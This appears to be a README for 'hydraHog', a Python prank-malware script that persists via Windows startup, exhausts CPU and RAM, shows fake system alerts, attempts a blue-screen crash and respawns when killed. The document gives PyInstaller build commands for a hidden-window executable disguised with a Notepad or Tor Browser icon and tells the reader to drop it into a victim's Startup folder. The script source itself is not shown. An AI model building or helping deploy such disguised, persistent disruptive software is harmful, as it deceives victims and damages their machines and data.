### _Cut one core, two shall rise._  

![hydraHog banner](image.png)

> ⚠️ **This script is a chaotic digital entity. It inhales CPU & RAM like Chrome with 38 tabs and a superiority complex. Use it for mischief, memes, or modern-day justice.**

---

## 🤖 What It Actually Does
- Can **auto-start on boot** (like a digital parasite)[^1]
- Slowly chokes **RAM** and **CPU** to near-death (customizable).
- Spams **fake system alerts** about your potato-tier hardware.
- After a set time (default: 5 mins), it attempts a **BSOD**[^2]
- If terminated from Task Manager? It **respawns like it’s in Dragon Ball**.

---

## 🧟 Add to Startup (a.k.a. Digital Haunting)

> Be the reason someone fears restarting their PC.

## 🛠️ Compile to .exe (Disguise Level: Government Software)
Wanna prank like a pro? Here’s how to make it look official:

### 1. Install PyInstaller
```bash
pip install pyinstaller
```
### 2. Build it
```bash
pyinstaller --noconfirm --onefile --windowed --icon=youricon.ico hydraHog.py
```
  - --windowed: Hides terminal window (stealth mode)
  
  - --icon: Confuse them with a Notepad icon or something cursed (you can download and use the icon in the repo)
  
  - --onefile: Clean single .exe output
### 3. Copy the .exe from the dist/ folder and drop it into Startup for maximum chaos.

## 🖼️ Icon Recommendation (aka “Meme Fuel”)

![hydraHog logo](hydraHog.png)

> Try using a random .ico like:
> - **📝 Notepad**  
> - **🧅 Tor Browser**
> - **🐸 Pepe**
> - **📀 WinRAR 2002 Edition**

  **Confusion = Power.**
